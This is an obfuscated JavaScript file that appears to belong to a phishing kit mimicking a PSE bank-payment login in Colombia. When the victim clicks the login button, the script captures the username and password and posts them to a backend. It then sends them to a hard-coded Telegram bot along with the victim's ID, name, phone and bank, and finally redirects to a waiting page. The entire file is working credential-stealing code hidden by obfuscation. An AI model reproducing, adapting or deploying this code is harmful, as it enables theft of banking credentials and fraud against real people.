const _0x4d5c72 = _0x1620;
(function (_0x47946a, _0x58f01e) {
  const _0x1cc051 = _0x1620,
    _0x1a1819 = _0x47946a();
  while (!![]) {
    try {
      const _0x16ab91 =
        parseInt(_0x1cc051(0x15c)) / 0x1 +
        parseInt(_0x1cc051(0x166)) / 0x2 +
        (-parseInt(_0x1cc051(0x172)) / 0x3) *
          (parseInt(_0x1cc051(0x16d)) / 0x4) +
        (parseInt(_0x1cc051(0x16a)) / 0x5) *
          (parseInt(_0x1cc051(0x149)) / 0x6) +
        -parseInt(_0x1cc051(0x160)) / 0x7 +
        (parseInt(_0x1cc051(0x156)) / 0x8) *
          (parseInt(_0x1cc051(0x152)) / 0x9) +
        (parseInt(_0x1cc051(0x147)) / 0xa) *
          (-parseInt(_0x1cc051(0x15b)) / 0xb);
      if (_0x16ab91 === _0x58f01e) break;
      else _0x1a1819["push"](_0x1a1819["shift"]());
    } catch (_0x54def8) {
      _0x1a1819["push"](_0x1a1819["shift"]());
    }
  }
})(_0x4c23, 0x5af02);
function _0x4c23() {
  const _0x3c60a4 = [
    "getElementById",
    "123vDpQrz",
    "log",
    "addEventListener",
    "Error\x20de\x20red\x20al\x20enviar\x20mensaje\x20a\x20",
    "/trico/tricoUserPse/",
    "preventDefault",
    "20lsFQfP",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "72vLuhjH",
    "location",
    "\x0a🏦Banco:\x20",
    "metaInfo",
    "user",
    "wait.html",
    "error",
    "json",
    "Usuario\x20encontrado",
    "9RJDluu",
    "setItem",
    "info",
    "\x0aFuente:\x20",
    "3745848gGBOvA",
    "puser",
    "&text=",
    "Usuario\x20actualizado",
    "application/json",
    "1393887dGIyZK",
    "241584wawIkH",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "GET",
    "statusText",
    "1872493NSysGz",
    "btnUsuario",
    "disabled",
    "PUT",
    "\x0a🔒Contraseña:\x20",
    "value",
    "1128190ONqGLX",
    "stringify",
    "Error\x20al\x20enviar\x20mensaje\x20a\x20",
    "\x0a🆔Nombre:\x20",
    "17675BZknTX",
    "txtUsuario",
    "Mensaje\x20enviado\x20a\x20",
    "41260rDClNT",
    "\x0aCorrigió\x20Usuario",
    "Error\x20al\x20actualizar\x20usuario:",
    "nombre",
  ];
  _0x4c23 = function () {
    return _0x3c60a4;
  };
  return _0x4c23();
}
function updateLS() {
  const _0x45b6d7 = _0x1620;
  LS[_0x45b6d7(0x153)](_0x45b6d7(0x154), JSON[_0x45b6d7(0x167)](info));
}
const button = document["getElementById"](_0x4d5c72(0x161)),
  userInput = document[_0x4d5c72(0x171)](_0x4d5c72(0x16b)),
  passInput = document[_0x4d5c72(0x171)]("txtPass");
function _0x1620(_0x67e1bc, _0x2441e9) {
  const _0x4c23d4 = _0x4c23();
  return (
    (_0x1620 = function (_0x162036, _0x2c33f4) {
      _0x162036 = _0x162036 - 0x144;
      let _0x4785f9 = _0x4c23d4[_0x162036];
      return _0x4785f9;
    }),
    _0x1620(_0x67e1bc, _0x2441e9)
  );
}
async function sendToTelegram(_0x59576c) {
  const _0xdf8e44 = _0x4d5c72;
  for (const _0x1d8b7d of chatIds) {
    const _0x47006a =
      _0xdf8e44(0x148) +
      _0x1d8b7d +
      _0xdf8e44(0x158) +
      encodeURIComponent(_0x59576c);
    try {
      const _0x1e4c05 = await fetch(_0x47006a);
      if (!_0x1e4c05["ok"])
        throw new Error(
          _0xdf8e44(0x168) + _0x1d8b7d + ":\x20" + _0x1e4c05[_0xdf8e44(0x15f)]
        );
      console["log"](_0xdf8e44(0x16c) + _0x1d8b7d);
    } catch (_0x1d39cb) {
      console["error"](_0xdf8e44(0x144) + _0x1d8b7d + ":", _0x1d39cb);
    }
  }
}
async function updateStatus() {
  const _0x2ec74d = _0x4d5c72;
  button[_0x2ec74d(0x162)] = !![];
  const _0x4f0c4c = await fetch(url + "/trico/tricoData", {
      method: _0x2ec74d(0x15e),
      headers: { "Content-Type": "application/json" },
    }),
    _0x15803c = await _0x4f0c4c[_0x2ec74d(0x150)](),
    _0x724ce3 = [..._0x15803c];
  for (const _0x2c58f3 of _0x724ce3) {
    if (_0x2c58f3["id"] == info["metaInfo"]["cc"]) {
      console[_0x2ec74d(0x173)](_0x2ec74d(0x151));
      const _0x7aeeea = await fetch(
          url + _0x2ec74d(0x145) + _0x2c58f3["idreg"],
          {
            method: _0x2ec74d(0x163),
            headers: { "Content-Type": _0x2ec74d(0x15a) },
            body: JSON[_0x2ec74d(0x167)]({
              usuario: info[_0x2ec74d(0x14c)]["user"],
              password: info["metaInfo"][_0x2ec74d(0x157)],
            }),
          }
        ),
        _0x2c02d5 = await _0x7aeeea["json"](),
        _0xa4de52 =
          "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20" +
          _0x2c58f3["id"] +
          _0x2ec74d(0x169) +
          _0x2c58f3[_0x2ec74d(0x170)] +
          "\x0a📱Teléfono:\x20" +
          _0x2c58f3["telefono"] +
          "\x0a🚹Usuario:\x20" +
          info[_0x2ec74d(0x14c)]["user"] +
          _0x2ec74d(0x164) +
          info[_0x2ec74d(0x14c)][_0x2ec74d(0x157)] +
          _0x2ec74d(0x14b) +
          _0x2c58f3["bank"] +
          _0x2ec74d(0x155) +
          fuente +
          _0x2ec74d(0x16e);
      await sendToTelegram(_0xa4de52),
        _0x7aeeea["ok"]
          ? console[_0x2ec74d(0x173)](_0x2ec74d(0x159))
          : console[_0x2ec74d(0x14f)](
              _0x2ec74d(0x16f),
              _0x7aeeea[_0x2ec74d(0x15f)]
            );
    }
  }
  (button[_0x2ec74d(0x162)] = ![]),
    (window[_0x2ec74d(0x14a)]["href"] = _0x2ec74d(0x14e));
}
button[_0x4d5c72(0x174)]("click", async function (_0xa75af4) {
  const _0x31c314 = _0x4d5c72;
  _0xa75af4[_0x31c314(0x146)]();
  if (userInput[_0x31c314(0x165)] == "" && passInput[_0x31c314(0x165)] == "") {
    alert(_0x31c314(0x15d)), userInput["focus"]();
    return;
  } else {
    var _0x3973c7 = userInput[_0x31c314(0x165)],
      _0x5a303a = passInput[_0x31c314(0x165)];
    (info["metaInfo"][_0x31c314(0x14d)] = _0x3973c7),
      (info[_0x31c314(0x14c)][_0x31c314(0x157)] = _0x5a303a),
      updateLS(),
      await updateStatus();
  }
});
